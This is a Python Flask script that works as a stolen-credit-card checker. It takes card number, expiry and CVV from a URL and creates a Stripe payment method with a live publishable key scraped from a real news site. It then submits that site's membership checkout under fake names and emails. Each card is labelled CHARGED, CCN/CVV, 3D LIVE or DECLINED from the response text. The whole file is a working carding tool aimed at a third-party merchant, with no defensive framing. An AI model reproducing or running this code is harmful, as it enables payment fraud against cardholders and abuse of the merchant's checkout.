from requests import Session as s
from random import randint as ran
from random import choices as cho
from faker import Faker
from flask import Flask
app = Flask(__name__)
faker = Faker()
s().follow_redirects = True
s().verify = False

def typ(cc):
    cc = str(cc)
    cc = cc[0]
    if cc == "3":
        card_type = "amex"
    elif cc == "4":
        card_type = "visa"
    elif cc == "5":
        card_type = "mastercard"
    elif cc == "6":
        card_type = "discover"
    else:
        card_type = "Unknown"
    return card_type
    
@app.route("/card=<cc>")
def check(cc):
    try:
        num, mon, yer, cvv = map(str.strip, cc.split("|"))
        name = faker.first_name().upper()
        email = name + ''.join(cho("qwertyuiopasdfghjklzxcvbnm123456789", k=10)) + "@gmail.com"
        
        url = "https://api.stripe.com/v1/payment_methods"
        data = {
"type":"card",
"billing_details[address][line1]":"",
"billing_details[address][line2]":"",
"billing_details[address][city]":"",
"billing_details[address][state]":"",
"billing_details[address][postal_code]":"10080",
"billing_details[address][country]":"US",
"billing_details[name]":name,
"card[number]":num,
"card[cvc]":cvv,
"card[exp_month]":mon,
"card[exp_year]":f"{yer if len(yer)==2 else yer[2:]}",
"guid":"NA",
"muid":"NA",
"sid":"NA",
"pasted_fields":"number",
"payment_user_agent":"stripe.js%2F088e2e9be8%3B+stripe-js-v3%2F088e2e9be8%3B+split-card-element",
"referrer":"https%3A%2F%2Fvisegradinsight.eu",
"time_on_page":"168984",
"key":"pk_live_51HUqhxLeEmKrqQJR77B80B22wogbwGcRMmqAH3Y4ERXdmsKWFGJOJI9ycH1rIVBzH1ZGG5Zkfkjw7M3DdZtqGDAe00a9laqj2v"
        }
        headers = {
            "authority": "api.stripe.com",
            "method": "POST",
            "path": "/v1/payment_methods",
            "scheme": "https",
            "accept": "application/json",
            "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referrer": "https://js.stripe.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36"
        }
        response = s().post(url, headers=headers, data=data).json()
        id = response["id"]
        
        if not id:
            return f"Card: {cc} - Error: Unable to create payment method."
        
        url = "https://visegradinsight.eu/membership-account/membership-checkout/"
        data = {
    'level': '3',
    'checkjavascript': '1',
    'other_discount_code': '',
    'discount_code': '',
    'username': '',
    'bfirstname': name,
    'blastname': name,
    'bemail': email,
    'password': 'Op@88888',
    'password2': 'Op@88888',
    'bconfirmemail_copy': '1',
    'fullname': '',
    'baddress1': '',
    'baddress2': '',
    'bcity': '',
    'bstate': '',
    'bphone': '',
    'vat_number': '',
    'bzipcode': '10080',
    'bcountry': 'US',
    'CardType': typ(num),
    'submit-checkout': '1',
    'javascriptok': '1',
    'apbct_visible_fields': '{"0":{"visible_fields":"other_discount_code other_discount_code_button discount_code discount_code_button username bfirstname blastname bemail password password2 fullname baddress1 baddress2 bcity bstate bphone vat_number bzipcode bcountry","visible_fields_count":19,"invisible_fields":"level checkjavascript bconfirmemail_copy CardType submit-checkout javascriptok","invisible_fields_count":6}}',
    'payment_method_id': id,
    'AccountNumber': f'XXXXXXXXXXXX{num[12:]}',
    'ExpirationMonth': '03',
    'ExpirationYear': f'{yer if len(yer)==4 else str(20)+yer}',
}
        
        headers = {
    'authority': 'visegradinsight.eu',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://visegradinsight.eu',
    'pragma': 'no-cache',
    'referer': 'https://visegradinsight.eu/membership-account/membership-checkout/?level=3',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}

        params = {
		    'level': '3',
		    }
    
        response = s().post(url, headers=headers,params=params,data=data).text.lower()
        with open("test.html","w") as f:
            f.write(response) 
        
        if any(msg in response for msg in ["succeeded","payment-success","successfully","thank you for your support","insufficient funds","insufficient_funds","payment-successfully","your card does not support this type of purchase","thank you","membership confirmation","/wishlist-member/?reg=","thank you for your payment","thank you for membership","payment received","your order has been received","purchase successful","your card is not supported"]):
               with open("charged.html","w") as f:
                   f.write(response)
               msg = "CHARGED"
               
        elif any(msg in response for msg in ["incorrect_cvc","invalid cvc","invalid_cvc","incorrect cvc","incorrect cvv","incorrect_cvv","invalid_cvv","invalid cvv",'"cvv_check":"pass"',"cvv_check: pass","security code is invalid","security code is incorrect","zip code is incorrect","zip code is invalid","card is declined by your bank","lost_card","stolen_card","transaction_not_allowed","pickup_card"]):
               with open("CCN/CVV.html","w") as f:
                   f.write(response)
               msg = "CCN/CVV"
               
        elif any(msg in response for msg in ["authentication required","three_d_secure","3d secure","stripe_3ds2_fingerprint"]):
               with open("3D LIVE.html","w") as f:
                   f.write(response)
               msg = "3D LIVE"
               
        elif any(msg in response for msg in ["declined","do_not_honor","generic_decline","decline by your bank","expired_card","your card has expired","incorrect_number","card number is incorrect","processing_error","service_not_allowed","lock_timeout","card was declined","fraudulent"]):
               msg = "DECLINED"
               
        else:
               msg = "DECLINED[UNKNOWN]"
               
        return {"Author":"Sahid","Status":msg,"Gateway":"Stripe Auth","Card":cc}
    
    except Exception as e:
        return {"Author":"Sahid","Status":str(e)}

if __name__ == "__main__":
    app.run(host="0.0.0.0",port=8008)
